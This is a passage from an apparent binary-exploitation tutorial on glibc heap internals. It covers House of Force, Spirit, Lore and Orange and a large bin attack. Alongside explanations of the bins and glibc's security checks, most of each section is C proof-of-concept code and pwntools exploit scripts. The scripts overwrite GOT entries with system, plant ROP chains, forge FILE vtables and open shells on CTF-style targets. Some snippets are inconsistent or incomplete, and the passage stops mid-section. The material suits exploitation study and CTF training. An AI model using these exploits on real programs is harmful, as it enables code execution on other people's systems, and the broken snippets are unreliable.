if (tcache->counts[tc_idx] >= TCACHE_MAX_BINS)
    malloc_printerr();
```

### Tcache Debugging Commands

**GDB (pwndbg) tcache inspection:**

```gdb
# View all tcache bins
tcachebins

# View specific tcache bin
tcache <bin_index>

# View tcache struct
x/64gx <heap_base>

# Pretty print tcache
p *(tcache_perthread_struct *)<heap_base>

# Find tcache chunks
find_tcache <address>

# Heap visualization (shows tcache)
vis_heap_chunks
```

**Manual tcache parsing:**

```gdb
# Get heap base
info proc mappings
# Find [heap]

# View tcache counts
x/64hx <heap_base>

# View tcache entries
x/64gx <heap_base>+0x80

# Follow next pointers
x/gx <tcache_entry>
set $next = *(unsigned long *)<tcache_entry>
x/gx $next
```

---

**Critical related topics:**

- **Hook-based exploitation** (__malloc_hook, __free_hook, __realloc_hook strategies)
- **Safe-linking bypass techniques** (pointer mangling in glibc 2.32+)
- **FSOP (File Stream Oriented Programming)** for alternative code execution
- **Heap exploitation mitigations** (ASLR, guard pages, pointer encryption)

---

## Heap Fundamentals

### Glibc malloc (ptmalloc2)

Linux systems primarily use glibc's malloc implementation (ptmalloc2), which is based on dlmalloc with threading support.

**Key concepts**:

- **Chunks**: Basic allocation units containing metadata and user data
- **Bins**: Free chunk storage organized by size
- **Arenas**: Per-thread heap regions to reduce lock contention
- **Top chunk**: Wilderness - expands to satisfy large requests

### Chunk Structure

**Allocated chunk**:

```
    +------------------+
    | prev_size        |  (only used if previous chunk is free)
    +------------------+
    | size | flags     |  (chunk size and status bits)
    +------------------+
    | user data        |
    |                  |
    +------------------+
```

**Free chunk**:

```
    +------------------+
    | prev_size        |
    +------------------+
    | size | flags     |
    +------------------+
    | fd (forward ptr) |  (pointer to next free chunk)
    +------------------+
    | bk (back ptr)    |  (pointer to previous free chunk)
    +------------------+
    | user data area   |
    | (unused)         |
    +------------------+
    | prev_size copy   |  (footer for coalescing)
    +------------------+
```

**Chunk header fields**:

```c
struct malloc_chunk {
    size_t prev_size;    // Size of previous chunk (if free)
    size_t size;         // Size of this chunk
    struct malloc_chunk *fd;  // Forward pointer (if free)
    struct malloc_chunk *bk;  // Backward pointer (if free)
};
```

**Size field flags** (last 3 bits):

```
Bit 0 (0x1): PREV_INUSE (P) - Previous chunk is in use
Bit 1 (0x2): IS_MMAPPED (M) - Chunk obtained via mmap
Bit 2 (0x4): NON_MAIN_ARENA (N) - Chunk is not in main arena
```

**Size calculation**:

```c
// Actual chunk size (aligned to 16 bytes on 64-bit, 8 bytes on 32-bit)
size_t chunk_size = size_field & ~0x7;  // Mask off flag bits

// Minimum chunk size: 4 * sizeof(size_t)
// 32-bit: 16 bytes
// 64-bit: 32 bytes
```

### Bins Overview

Bins organize free chunks for efficient allocation and reuse.

**Bin types**:

1. **Fast bins** (fastbinsY): 10 singly-linked LIFO lists for small chunks
    
    - Sizes: 16-80 bytes (64-bit), 8-64 bytes (32-bit)
    - No coalescing (keeps prev_inuse bit set)
    - Fast allocation/deallocation
2. **Unsorted bin**: Doubly-linked list acting as cache
    
    - Single bin for all recently freed chunks
    - Sorted during allocation into appropriate bins
3. **Small bins**: 62 doubly-linked lists for chunks < 512 bytes (32-bit) or < 1024 bytes (64-bit)
    
    - Fixed size per bin (8-byte increments on 32-bit, 16-byte on 64-bit)
    - FIFO allocation
4. **Large bins**: 63 doubly-linked lists for large chunks
    
    - Size ranges per bin
    - Additional fd_nextsize/bk_nextsize pointers for size ordering

**Bin indexing**:

```c
// Fast bins: index = (size >> 4) - 2  (64-bit)
// Small bins: index = size >> 4  (64-bit)
// Large bins: complex calculation based on size ranges
```

### Allocation Flow

```
malloc(size) request
    ↓
Check fast bins for exact size
    ↓ (not found)
Check small bins for exact size
    ↓ (not found)
Check unsorted bin, sort into appropriate bins
    ↓ (not found)
Check large bins
    ↓ (not found)
Use top chunk (split if large enough)
    ↓ (top chunk too small)
Extend heap via sbrk() or create new mmap region
```

### Free Flow

```
free(ptr)
    ↓
Check if chunk qualifies for fast bin
    ↓ Yes: Insert into fast bin (LIFO), no coalescing
    ↓ No: Continue
    ↓
Attempt backward coalescing (if prev chunk free)
    ↓
Attempt forward coalescing (if next chunk free)
    ↓
Insert into unsorted bin
    ↓
If chunk borders top chunk, consolidate with top
```

### Security Mechanisms

Modern glibc includes numerous heap corruption checks:

**Double-free detection**:

```c
// Fast bin: Check if chunk at head has same address
if (victim == *fb) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
```

**Chunk size validation**:

```c
// Check minimum and alignment
if (size < MINSIZE || !aligned_OK(size)) {
    errstr = "free(): invalid size";
    goto errout;
}

// Check if size matches next chunk's prev_size
if (chunksize(nextchunk) != prev_size) {
    errstr = "free(): invalid next size (fast)";
    goto errout;
}
```

**Unlinking checks** (safe unlinking):

```c
// Verify forward and backward pointers
if (FD->bk != P || BK->fd != P) {
    corrupted_chunk(P);
}
```

**Top chunk integrity**:

```c
// Verify top chunk size is page-aligned and reasonable
if ((unsigned long)(size) < (unsigned long)(MINSIZE) ||
    ((unsigned long)(size) & (pagesz - 1)) != 0) {
    malloc_printerr("malloc(): corrupted top size");
}
```

**[Inference]**: Security checks vary by glibc version. Older versions (< 2.26) have fewer protections, while newer versions include additional hardening. Specific checks should be verified against the target libc version.

### Debugging Heap

**GDB with pwndbg**:

```bash
# View heap chunks
heap
heap -v                     # Verbose output

# View bins
bins                        # All bins
fastbins                    # Fast bins only
unsortedbin                 # Unsorted bin
smallbins                   # Small bins
largebins                   # Large bins

# View specific chunk
x/20gx <address>            # Examine chunk memory

# Find chunks
search -t chunk             # Search for chunks
vis_heap_chunks             # Visual heap layout

# Arena information
arena                       # Current arena info
arenas                      # All arenas
```

**pwndbg heap commands**:

```bash
# Parse chunk at address
parseheap <address>

# Display heap bins
bins
fastbins
tcachebins                  # Thread cache bins (glibc >= 2.26)

# Heap analysis
heap_analysis_start         # Start recording heap ops
heap_analysis_stop          # Stop and display results
```

**Manual examination**:

```bash
# Main arena structure location
p main_arena

# Top chunk
p main_arena.top

# Fast bins array
p main_arena.fastbinsY

# Bins array
p main_arena.bins
```

## House of Force

House of Force exploits the top chunk by corrupting its size field to gain arbitrary write capability.

### Attack Prerequisites

1. **Heap overflow**: Ability to overwrite top chunk size
2. **Controlled malloc size**: Can specify allocation size
3. **Additional allocation**: Need at least one more malloc after corruption

### Attack Mechanism

**Top chunk behavior**:

```c
// When malloc requests N bytes and bins don't satisfy:
if (av->top is large enough) {
    remainder_size = chunksize(av->top) - nb;
    victim = av->top;
    av->top = chunk_at_offset(victim, nb);  // Move top chunk forward
    set_head(av->top, remainder_size | PREV_INUSE);
    return chunk2mem(victim);
}
```

**Exploitation steps**:

1. **Overflow top chunk size**: Set to `-1` (0xffffffffffffffff on 64-bit) or very large value
2. **Calculate evil size**: To move top chunk to target address
3. **Trigger allocation**: malloc(evil_size) moves top chunk
4. **Allocate at target**: Next malloc returns target address

### Detailed Example

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    uint64_t *chunk1, *chunk2, *target_addr;
    uint64_t evil_size;
    
    // Setup
    chunk1 = malloc(0x100);
    printf("Chunk1: %p\n", chunk1);
    
    // Assume target address we want to write to
    target_addr = (uint64_t *)0x601000;  // Example: GOT entry
    printf("Target: %p\n", target_addr);
    
    // Step 1: Overflow to corrupt top chunk size
    // chunk1 + 0x100 bytes of data + 8 bytes (prev_size) = top chunk size
    uint64_t *top_chunk_size = chunk1 + 0x100/8 + 1;
    *top_chunk_size = 0xffffffffffffffff;  // Corrupt top chunk size
    
    printf("Top chunk corrupted with size: 0x%lx\n", *top_chunk_size);
    
    // Step 2: Calculate evil_size to move top to target
    // evil_size = target_addr - top_chunk - 0x10 (chunk header)
    // We want: current_top + evil_size + 0x10 = target_addr
    uint64_t current_top = (uint64_t)(chunk1 + 0x100/8 + 2);  // After chunk1 data and header
    evil_size = (uint64_t)target_addr - current_top - 0x10;
    
    printf("Evil size: 0x%lx\n", evil_size);
    
    // Step 3: Trigger allocation with evil_size
    chunk2 = malloc(evil_size);
    printf("Chunk2 (evil allocation): %p\n", chunk2);
    
    // Step 4: Next allocation returns target address
    uint64_t *controlled = malloc(0x100);
    printf("Controlled chunk: %p\n", controlled);
    
    // Now we can write to target_addr via controlled
    if (controlled == target_addr) {
        printf("Success! We control target address\n");
        *controlled = 0xdeadbeef;  // Arbitrary write
    }
    
    return 0;
}
```

### Practical Exploitation

**Typical CTF scenario**:

```python
from pwn import *

# Connect to target
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Step 1: Leak heap address
p.sendline(b'1')  # Allocate chunk
p.recvuntil(b'Chunk at: ')
heap_base = int(p.recvline().strip(), 16)
log.info(f"Heap base: {hex(heap_base)}")

# Step 2: Overflow to corrupt top chunk
payload = b'A' * 0x100  # Fill chunk
payload += p64(0)       # prev_size (fake)
payload += p64(0xffffffffffffffff)  # size (corrupted)
p.sendline(b'2')        # Trigger overflow
p.send(payload)

# Step 3: Calculate evil size
target = elf.got['free']  # Target: GOT entry
current_top = heap_base + 0x110  # After first chunk
evil_size = target - current_top - 0x10
evil_size &= 0xffffffffffffffff  # Ensure unsigned

log.info(f"Target: {hex(target)}")
log.info(f"Evil size: {hex(evil_size)}")

# Step 4: Allocate with evil size
p.sendline(b'1')
p.sendline(str(evil_size).encode())

# Step 5: Allocate at target
p.sendline(b'1')
p.sendline(b'256')
p.recvuntil(b'Data: ')
# Now we can write to GOT
p.send(p64(elf.plt['system']))  # Overwrite free with system

# Trigger
p.sendline(b'3')  # Call free("/bin/sh") -> system("/bin/sh")
p.interactive()
```

### Mitigations and Bypasses

**Mitigation**: Size validation on top chunk

```c
// Modern glibc checks
if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
    remainder_size = size - nb;
    // ...
} else {
    malloc_printerr("malloc(): corrupted top size");
}
```

**Bypass approaches**:

- Target older glibc versions (< 2.26) with weaker checks
- Combine with information leaks to calculate valid sizes
- Use alternative heap exploitation techniques

**[Unverified]**: House of Force effectiveness varies significantly across glibc versions. Modern versions (>= 2.29) include additional integrity checks that may prevent this attack. Testing against the specific target environment is required.

## House of Spirit

House of Spirit forges a fake chunk in a controlled memory region and tricks free() into placing it in a fastbin, enabling arbitrary allocation at that location.

### Attack Prerequisites

1. **Stack/data control**: Ability to create fake chunk structure
2. **Free with controlled pointer**: Can call free() with attacker-controlled address
3. **Subsequent allocation**: malloc() of appropriate size to retrieve fake chunk

### Attack Mechanism

**Fast bin insertion**:

```c
// free() for fast bin chunks
size_t size = chunksize(p);
unsigned int idx = fastbin_index(size);
fb = &fastbin(av, idx);
*fb = p;  // Insert at head (LIFO)
p->fd = old;
```

**Fast bin allocation**:

```c
// malloc() from fast bin
if ((unsigned long)(nb) <= get_max_fast()) {
    idx = fastbin_index(nb);
    fb = &fastbin(av, idx);
    victim = *fb;
    if (victim != 0) {
        *fb = victim->fd;  // Remove from bin
        return chunk2mem(victim);
    }
}
```

**Exploitation flow**:

1. **Craft fake chunk**: Create chunk structure with valid size field
2. **Free fake chunk**: Call free() on fake chunk address
3. **Allocate**: malloc() same size retrieves fake chunk
4. **Write**: Control chunk data, potentially overwriting critical data

### Detailed Example

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    uint64_t stack_buffer[20];  // Controlled stack region
    uint64_t *fake_chunk;
    uint64_t *next_chunk;
    
    // Step 1: Construct fake chunk on stack
    fake_chunk = &stack_buffer[2];  // Leave space for prev_size
    
    // Set chunk size (must be valid fastbin size)
    // Size field at offset -8 from returned pointer
    stack_buffer[1] = 0x71;  // Size = 0x70 + PREV_INUSE flag
    
    // Step 2: Create fake next chunk to pass size validation
    // free() checks: next_chunk->size > 2*SIZE_SZ && next_chunk->size < av->system_mem
    next_chunk = fake_chunk + 0x70/8;  // 0x70 bytes forward
    next_chunk[0] = 0x21;  // Fake next chunk size (small, valid)
    
    printf("Fake chunk at: %p\n", fake_chunk);
    printf("Fake chunk size: 0x%lx\n", stack_buffer[1]);
    
    // Step 3: Free fake chunk (insert into fastbin)
    free(fake_chunk);
    printf("Fake chunk freed\n");
    
    // Step 4: Allocate same size - retrieves our fake chunk
    uint64_t *controlled = malloc(0x68);  // Request size that yields 0x70 chunk
    printf("Allocated chunk at: %p\n", controlled);
    
    // Verify we got the fake chunk
    if (controlled == fake_chunk) {
        printf("Success! Allocated our fake chunk\n");
        printf("We now control stack memory via heap allocation\n");
        
        // Can write arbitrary data
        controlled[0] = 0xdeadbeef;
        printf("Stack buffer modified via heap: 0x%lx\n", stack_buffer[2]);
    }
    
    return 0;
}
```

**Compile and test**:

```bash
gcc -g house_of_spirit.c -o house_of_spirit -no-pie
./house_of_spirit
```

### Practical CTF Exploitation

**Common scenario**: Vulnerable program with buffer on stack and free() with controlled pointer.

```python
from pwn import *

context.arch = 'amd64'

p = process('./vuln')
elf = ELF('./vuln')

# Assume we have stack buffer overflow
# Goal: Forge chunk, free it, then allocate to control stack

# Step 1: Leak stack address (via format string or other)
p.sendline(b'%p')
p.recvuntil(b'0x')
stack_leak = int(p.recvline().strip(), 16)
fake_chunk_addr = stack_leak + 0x100  # Adjust offset
log.info(f"Fake chunk at: {hex(fake_chunk_addr)}")

# Step 2: Build fake chunk on stack
payload = b'A' * 8           # Padding
payload += p64(0x71)         # Size field (fastbin size)
payload += b'B' * 0x60       # Chunk data
payload += p64(0x21)         # Next chunk size (for validation)

p.sendline(b'1')  # Trigger overflow
p.send(payload)

# Step 3: Trigger free with fake chunk address
# Vulnerable code: free(user_pointer);
p.sendline(b'2')
p.sendline(str(fake_chunk_addr).encode())

log.info("Fake chunk freed into fastbin")

# Step 4: Allocate to retrieve fake chunk
p.sendline(b'3')
p.sendline(b'104')  # Request 0x68 bytes (yields 0x70 chunk)

# Step 5: Write payload via this allocation
p.sendline(b'4')
# Now writing to heap actually writes to stack
rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(system)
p.send(rop_chain)

# Trigger return with ROP chain on stack
p.sendline(b'5')
p.interactive()
```

### Advanced Techniques

**Fake chunk in .bss**:

```python
# If we can write to .bss section
bss_addr = elf.bss(0x100)

# Write fake chunk structure
write(bss_addr - 8, p64(0x71))      # Size
write(bss_addr + 0x60, p64(0x21))   # Next size

# Free fake chunk
free_bss(bss_addr)

# Allocate - now malloc returns .bss address
chunk = malloc(0x68)
# Control .bss via heap operations
```

**Targeting GOT entries**:

```python
# Create fake chunk before GOT entry
got_entry = elf.got['free']
fake_chunk = got_entry - 0x10  # Account for chunk header

# Setup fake chunk
write(fake_chunk, p64(0x0))        # prev_size
write(fake_chunk + 8, p64(0x21))   # size (small fastbin)
write(got_entry + 0x10, p64(0x21)) # next chunk size

# Free and reallocate
free(fake_chunk + 0x10)  # +0x10 for user data offset
malloc(0x18)

# Write to GOT
write_got(p64(one_gadget))
```

### Size Requirements

**Valid fastbin sizes** (64-bit):

```
0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80
```

**Size validation**:

```c
// free() checks next chunk size
size_t nextsize = chunksize(nextchunk);
if (__builtin_expect(nextsize <= 2 * SIZE_SZ, 0) ||
    __builtin_expect(nextsize >= av->system_mem, 0)) {
    errstr = "free(): invalid next size (fast)";
    goto errout;
}
```

**Requirements for fake chunk**:

- Size field must be valid fastbin size (aligned, with PREV_INUSE)
- Next chunk must have valid size (2*SIZE_SZ < size < system_mem)
- Proper alignment (16-byte on 64-bit)

### Mitigations

**Modern glibc protections**:

- Size validation (checks next chunk size)
- Alignment checks
- Double-free detection in fastbins
- tcache (>= 2.26) changes allocation behavior

**Bypass strategies**:

- Carefully craft compliant fake chunks
- Ensure all size fields pass validation
- Account for tcache in newer glibc versions
- Use information leaks to determine system_mem bounds

## House of Lore

House of Lore manipulates the small bin freelist by corrupting the bk (back) pointer, enabling allocation at an arbitrary location.

### Attack Prerequisites

1. **Small bin chunk**: Ability to free chunk into small bin (not fastbin)
2. **Overflow/UAF**: Control over freed chunk's bk pointer
3. **Fake chunk**: Controlled memory region with properly forged chunk
4. **Multiple allocations**: Need specific allocation sequence

### Attack Mechanism

**Small bin structure**:

```c
// Small bins are doubly-linked circular lists
// bin->fd points to first free chunk
// bin->bk points to last free chunk

// Unlinking from small bin during allocation:
victim = bin->bk;  // Get last chunk
bin->bk = victim->bk;  // Update bin's back pointer
victim->bk->fd = bin;  // Update next chunk's forward pointer
```

**Safe unlinking check**:

```c
// Modern glibc validates:
if (__builtin_expect(victim->bk->fd != victim ||  victim->fd->bk != victim, 0)) {
    malloc_printerr("corrupted double-linked list");
}
```

**Exploitation flow**:

1. **Allocate and free**: Create chunks, free into small bin
2. **Corrupt bk pointer**: Overflow to modify victim->bk to point to fake chunk
3. **Craft fake chunk**: Create fake chunk with proper fd/bk pointers
4. **Trigger allocation**: malloc retrieves corrupted chunk, then fake chunk

### Detailed Example (Conceptual)

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    uint64_t *chunk1, *chunk2, *chunk3;
    uint64_t stack_buffer[10];
    uint64_t *fake_chunk = &stack_buffer[2];
    
    // Step 1: Create chunks
    chunk1 = malloc(0x100);  // Small bin size
    chunk2 = malloc(0x100);
    chunk3 = malloc(0x100);  // Prevent consolidation with top
    
    printf("Chunk1: %p\n", chunk1);
    printf("Chunk2: %p\n", chunk2);
    
    // Step 2: Free into small bin (need to fill fastbins first or use larger size)
    free(chunk1);
    
    // Trigger sorting into small bin
    malloc(0x200);  // Large allocation forces unsorted bin processing
    
    // Step 3: Craft fake chunk on stack
    // Must pass: fake_chunk->bk->fd == fake_chunk
    stack_buffer[0] = 0;  // fake->prev_size
    stack_buffer[1] = 0x111;  // fake->size (match small bin size)
    stack_buffer[2] = (uint64_t)fake_chunk;  // fake->fd (points to itself)
    stack_buffer[3] = (uint64_t)fake_chunk;  // fake->bk (points to itself)
    
    printf("Fake chunk at: %p\n", fake_chunk);
    
    // Step 4: Corrupt chunk1's bk pointer (via overflow in chunk2 or UAF)
    // Assume we can overflow backwards or have UAF
    chunk1[2] = (uint64_t)fake_chunk;  // Overwrite bk pointer
    
    // Step 5: Allocate twice to retrieve fake chunk
    uint64_t *alloc1 = malloc(0x100);  // Gets original chunk1
    uint64_t *alloc2 = malloc(0x100);  // Gets fake chunk!
    
    printf("First allocation: %p\n", alloc1);
    printf("Second allocation: %p\n", alloc2);
    
    if (alloc2 == fake_chunk) {
        printf("Success! Allocated fake chunk from stack\n");
        alloc2[0] = 0xdeadbeef;
        printf("Modified stack via heap: 0x%lx\n", stack_buffer[2]);
    }
    
    return 0;
}
```

**Note**: This simplified example doesn't account for all modern protections. Real exploitation requires bypassing safe unlinking.

### Bypassing Safe Unlinking

**Challenge**: Modern glibc validates linked list integrity:

```c
if (victim->bk->fd != victim || victim->fd->bk != victim) {
    abort();
}
```

**Bypass strategy**: Ensure fake chunk satisfies checks

```c
// For victim->bk->fd != victim check:
// victim is the corrupted chunk in small bin
// victim->bk points to our fake chunk
// fake_chunk->fd must point back to victim

// Setup:
chunk_in_bin->bk = fake_chunk;  // Corrupt real chunk
fake_chunk->fd = chunk_in_bin;  // Fake->fd points to real chunk
fake_chunk->bk = fake_chunk_bk_region;  // Will be used in next check

// For fake_chunk->bk->fd != fake_chunk check:
fake_chunk_bk_region->fd = fake_chunk;  // Satisfy second check
```

### Practical Exploitation Example

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Step 1: Allocate chunks
p.sendline(b'1')  # malloc(0x100) -> chunk1
p.sendline(b'1')  # malloc(0x100) -> chunk2
p.sendline(b'1')  # malloc(0x100) -> chunk3 (guard)

# Step 2: Free chunk1 into small bin
p.sendline(b'2')  # free(chunk1)
p.sendline(b'0')  # Index 0

# Trigger small bin sorting
p.sendline(b'1')  # malloc(0x200) - large allocation
p.sendline(b'512')

# Step 3: Leak addresses
p.sendline(b'3')  # Show chunk1 (now in small bin)
p.recvuntil(b'Data: ')
leak = u64(p.recv(8))
libc.address = leak - libc.sym['__malloc_hook'] - 0x10
heap_base = leak - 0x1000  # Adjust based on actual offset
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"Heap base: {hex(heap_base)}")

# Step 4: Prepare fake chunk (on stack or in controlled memory)
# Assume we have stack overflow or controlled .bss region
fake_chunk = elf.bss(0x200)

# Build fake chunk structure
fake_fd = heap_base + 0x10  # Points to chunk1 in small bin
fake_bk = fake_chunk + 0x10  # Points to another controlled area

payload = p64(0)  # prev_size
payload += p64(0x111)  # size (must match small bin)
payload += p64(fake_fd)  # fd (satisfies victim->bk->fd == victim)
payload += p64(fake_bk)  # bk

# Write fake chunk
p.sendline(b'4')  # Write primitive
p.sendline(str(fake_chunk).encode())
p.send(payload)

# Additional fake chunk for bk->fd check
payload2 = p64(0) * 2
payload2 += p64(fake_chunk)  # fd pointing back to fake_chunk
p.sendline(b'4')
p.sendline(str(fake_bk).encode())
p.send(payload2)

# Step 5: Corrupt chunk1's bk pointer (via overflow or UAF)
p.sendline(b'5')  # Overflow function
p.sendline(b'1')  # Target chunk2
overflow_payload = b'A' * 0x100  # Fill chunk2
overflow_payload += p64(0x110)  # prev_size
overflow_payload += p64(0x111)  # size
overflow_payload += p64(leak)  # fd (original, don't corrupt)
overflow_payload += p64(fake_chunk)  # bk (corrupted!)
p.send(overflow_payload)

# Step 6: Allocate twice
p.sendline(b'1')  # First malloc(0x100) - gets chunk1
p.sendline(b'256')

p.sendline(b'1')  # Second malloc(0x100) - gets fake_chunk!
p.sendline(b'256')

# Step 7: Write to fake chunk (actually writing to .bss or stack)
p.sendline(b'6')  # Write data
p.sendline(b'1')  # Index of fake chunk allocation
# Overwrite function pointer, GOT, or other target
target_data = p64(libc.sym['system'])
p.send(target_data)

p.interactive()
```

### Tcache Considerations (glibc >= 2.26)

Modern glibc uses tcache (thread cache) which changes allocation behavior.

**Tcache priority**:

```
malloc() checks:
1. tcache (if available)
2. fastbins
3. small bins
4. large bins
```

**Adaptation required**:

- Fill tcache first (7 allocations per size)
- Then proceed with House of Lore on small bins
- Or target tcache directly with simpler attacks

```python
# Fill tcache for size 0x110
for i in range(7):
    p.sendline(b'1')  # Allocate
    p.sendline(b'256')

for i in range(7):
    p.sendline(b'2')  # Free into tcache
    p.sendline(str(i).encode())

# Now free() will use small bins
p.sendline(b'1')  # Allocate
p.sendline(b'1')  # Free - goes to small bin
# Continue House of Lore...
```

### Mitigations and Detection

**Protection mechanisms**:

- Safe unlinking checks (fd/bk validation)
- Tcache (changes bin usage patterns)
- Chunk size validation
- Pointer encryption in newer glibc (>= 2.32)

**Detection indicators**:

- Corrupted bin pointers
- Invalid chunk sizes
- Failed unlinking checks

**[Unverified]**: House of Lore complexity increases significantly with newer glibc versions. The specific bypass techniques depend on the target libc version and may require additional primitives like arbitrary write or extensive heap feng shui.

### Alternative: Large Bin Attack

Similar concept but targets large bins with additional pointers:

```c
// Large bin chunks have additional fields
struct malloc_chunk {
    size_t prev_size;
    size_t size;
    struct malloc_chunk *fd;
    struct malloc_chunk *bk;
    struct malloc_chunk *fd_nextsize;  // Next chunk of different size
    struct malloc_chunk *bk_nextsize;  // Previous chunk of different size
};
```

**Large bin insertion** (exploitable):

```c
// When inserting chunk into large bin, if sizes differ:
victim->bk_nextsize->fd_nextsize = victim;
victim->fd_nextsize->bk_nextsize = victim;

// Can be exploited to write arbitrary address
```

**Exploitation**:

```python
# Corrupt bk_nextsize to point to target - 0x20
# On insertion: target - 0x20 + 0x20 (fd_nextsize offset) = target
# Writes victim address to target

target = elf.got['free']
fake_bk_nextsize = target - 0x20

# Corrupt chunk in large bin
chunk->bk_nextsize = fake_bk_nextsize

# Trigger large bin insertion
malloc(size_larger_than_victim)
# target now contains victim address
```

## House of Orange

House of Orange is an advanced technique that doesn't require free(), instead leveraging the FILE structure and _IO_flush_all_lockp to achieve code execution.

### Attack Prerequisites

1. **No free() available**: Cannot call free function
2. **Heap overflow**: Ability to corrupt top chunk
3. **Control flow trigger**: Abort, exit, or other FILE operations
4. **Libc leak**: Need libc addresses for FILE structure setup

### Attack Components

House of Orange combines multiple exploitation primitives:

1. **Top chunk corruption**: Force malloc to use mmap for new allocations
2. **Unsorted bin attack**: Place fake FILE structure address in target location
3. **FSOP (File Stream Oriented Programming)**: Hijack _IO_list_all
4. **Vtable hijacking**: Control virtual function table calls

### Top Chunk Corruption

**Goal**: Force top chunk into unsorted bin by triggering sysmalloc.

**Mechanism**:

```c
// sysmalloc() checks top chunk
if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
    remainder_size = size - nb;
    // Use top chunk normally
} else {
    // Top chunk too small, need more memory
    // If old_size invalid, top chunk is freed into unsorted bin
}
```

**Exploitation**:

```python
# Step 1: Corrupt top chunk size
# Requirements:
# - Size must be page-aligned (least significant 12 bits = 0)
# - Size must be smaller than required allocation
# - Size must pass: size < system_mem && size > 2*SIZE_SZ

# Example corruption:
old_top_size = 0x21000  # Original size
fake_size = 0x1000      # Fake size (smaller, still page-aligned)

payload = b'A' * offset
payload += p64(fake_size | 1)  # Size with PREV_INUSE flag

# Step 2: Trigger large allocation
# Request size larger than fake top chunk size
malloc(0x2000)  # Forces sysmalloc

# Result: Old top chunk freed into unsorted bin
```

### Understanding FILE Structures

**FILE structure** (_IO_FILE):

```c
struct _IO_FILE {
    int _flags;                    // 0x0
    char *_IO_read_ptr;            // 0x8
    char *_IO_read_end;            // 0x10
    char *_IO_read_base;           // 0x18
    char *_IO_write_base;          // 0x20
    char *_IO_write_ptr;           // 0x28
    char *_IO_write_end;           // 0x30
    char *_IO_buf_base;            // 0x38
    char *_IO_buf_end;             // 0x40
    // ... more fields
    struct _IO_FILE *_chain;       // 0x68 - Next FILE in chain
    // ... more fields
    struct _IO_jump_t *vtable;     // 0xd8 - Virtual function table
};
```

**_IO_jump_t** (vtable):

```c
struct _IO_jump_t {
    size_t __dummy;
    size_t __dummy2;
    _IO_finish_t __finish;
    _IO_overflow_t __overflow;      // Called during flush
    _IO_underflow_t __underflow;
    // ... more function pointers
};
```

**_IO_list_all**: Global pointer to linked list of all FILE streams.

### FSOP Attack Flow

**Trigger points** that call _IO_flush_all_lockp:

```c
// abort() -> _IO_flush_all_lockp
// exit() -> _IO_cleanup -> _IO_flush_all_lockp  
// malloc_printerr() -> __libc_message -> abort()
```

**_IO_flush_all_lockp behavior**:

```c
for (fp = _IO_list_all; fp != NULL; fp = fp->_chain) {
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
        || (fp->_mode > 0 && ...)) && _IO_OVERFLOW(fp, EOF) == EOF) {
        result = EOF;
    }
}
```

**Exploitation conditions**:

```c
// To trigger _IO_OVERFLOW(fp, EOF):
fp->_mode <= 0
fp->_IO_write_ptr > fp->_IO_write_base

// _IO_OVERFLOW macro:
#define _IO_OVERFLOW(FP, CH) _IO_JUMP(FP, __overflow)(FP, CH)

// Calls: fp->vtable->__overflow(fp, EOF)
```

### Detailed House of Orange Example

```python
from pwn import *

context.arch = 'amd64'

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# =============== Step 1: Leak libc ===============
p.sendline(b'1')  # Allocate
p.sendline(b'2048')
p.sendline(b'2')  # Show (leaks heap/libc pointers)
p.recvuntil(b'Data: ')
leak = u64(p.recv(8))
libc.address = leak - 0x3c4b78  # Offset to main_arena
log.info(f"Libc base: {hex(libc.address)}")

# =============== Step 2: Corrupt top chunk ===============
# Overflow to modify top chunk size
payload = b'A' * 2048  # Fill current chunk
payload += p64(0)      # prev_size (not used)
payload += p64(0xf81)  # Corrupted size (page-aligned, smaller than needed)

p.sendline(b'3')  # Overflow function
p.send(payload)

# =============== Step 3: Force top chunk into unsorted bin ===============
# Allocate size larger than corrupted top chunk
p.sendline(b'1')  # Allocate
p.sendline(b'4096')  # Size > 0xf81, triggers sysmalloc
# Old top chunk now in unsorted bin

# =============== Step 4: Unsorted bin attack ===============
# Goal: Write unsorted bin address to _IO_list_all
# Unsorted bin behavior:
# victim = unsorted_bin->bk
# victim->bk = unsorted_bin
# If we control victim->bk, we write unsorted_bin address there

# Corrupt unsorted bin chunk's bk pointer
io_list_all = libc.sym['_IO_list_all']
unsorted_bin_attack_target = io_list_all - 0x10  # Adjust for offset

# Need to overflow into freed top chunk (now in unsorted bin)
payload = b'A' * 2048
payload += p64(0)      # prev_size
payload += p64(0xf81)  # size
payload += p64(0)      # fd (will be overwritten)
payload += p64(unsorted_bin_attack_target)  # bk (corrupted)

p.sendline(b'3')  # Overflow
p.send(payload)

# Trigger unsorted bin allocation
p.sendline(b'1')
p.sendline(b'1024')
# Now _IO_list_all points to unsorted_bin address on heap

# =============== Step 5: Craft fake FILE structure ===============
# Calculate where our fake FILE should be
# _IO_list_all now contains main_arena+88 (unsorted bin address)
# We need fake FILE at main_arena+88 - 0x10 (chunk header)

fake_file_addr = libc.sym['__malloc_hook'] + 0x30  # Example location in heap

# Build fake _IO_FILE structure
fake_file = p64(0xfbad1800)  # _flags (magic value)
fake_file += p64(0) * 3       # read pointers (unused)
fake_file += p64(0)           # _IO_write_base
fake_file += p64(0xffffffff)  # _IO_write_ptr (> write_base)
fake_file += p64(0) * 2       # _IO_write_end, _IO_buf_base
fake_file += p64(0)           # _IO_buf_end
fake_file += p64(0) * 4       # padding
fake_file += p64(0)           # _chain (next FILE, can be NULL)
fake_file += p64(0) * 6       # more padding to reach vtable offset
fake_file += p64(fake_vtable_addr)  # vtable pointer

# Build fake vtable
# vtable->__overflow will be called with (FILE*, EOF)
# We can place "/bin/sh" address and system address
fake_vtable = p64(0) * 2      # __dummy, __dummy2
fake_vtable += p64(0) * 1     # __finish
fake_vtable += p64(libc.sym['system'])  # __overflow -> system

# =============== Step 6: Write fake structures ===============
